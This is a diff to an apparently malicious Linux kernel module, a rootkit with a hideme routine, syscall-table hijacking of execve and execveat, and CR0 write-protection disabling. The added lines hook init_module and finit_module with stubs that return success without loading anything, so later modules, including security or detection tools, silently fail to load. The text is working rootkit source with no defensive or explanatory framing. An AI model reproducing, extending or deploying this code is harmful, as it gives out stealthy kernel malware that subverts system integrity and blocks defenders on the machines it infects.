@@ -51,6 +51,8 @@ static DEFINE_SPINLOCK(hide_lock);
 
 static asmlinkage long (*orig_execve)(const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp);
 static asmlinkage long (*orig_execveat)(int dfd, const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp, int flags); 
+static asmlinkage long (*orig_init_module)(void __user *umod, unsigned long len, const char __user *uargs);
+static asmlinkage long (*orig_finit_module)(int fd, const char __user *uargs, int flags);
 
 
 int compare_path(int fd, char *path);
@@ -293,7 +295,13 @@ static notrace void hideme(void) {
     }
 }
 
+notrace asmlinkage long hook_init_module(void __user *umod, unsigned long len, const char __user *uargs) {
+    return 0;
+}
 
+notrace asmlinkage long hook_finit_module(int fd, const char __user *uargs, int flags) {
+    return 0;
+}
 
 static void notrace disable_write_protection(void) {
     write_cr0(read_cr0() & (~0x00010000));
@@ -314,9 +322,13 @@ notrace static int roddy_init(void)
 
     orig_execve = (void *)sys_call_table[__NR_execve];
     orig_execveat = (void *)sys_call_table[__NR_execveat];  
+    orig_init_module   = (void *) sys_call_table[__NR_init_module];
+    orig_finit_module  = (void *) sys_call_table[__NR_finit_module]; 
 
     sys_call_table[__NR_execve] = (unsigned long)hook_execve;
     sys_call_table[__NR_execveat] = (unsigned long)hook_execveat; 
+    sys_call_table[__NR_init_module]  = (unsigned long) hook_init_module;
+    sys_call_table[__NR_finit_module] = (unsigned long) hook_finit_module; 
     
     enable_write_protection(); 
 
@@ -331,6 +343,8 @@ notrace static void roddy_exit(void)
 
     sys_call_table[__NR_execve] = (unsigned long)orig_execve;
     sys_call_table[__NR_execveat] = (unsigned long)orig_execveat; 
+    sys_call_table[__NR_init_module]  = (unsigned long) orig_init_module;
+    sys_call_table[__NR_finit_module] = (unsigned long) orig_finit_module; 
 
     enable_write_protection(); 
 }
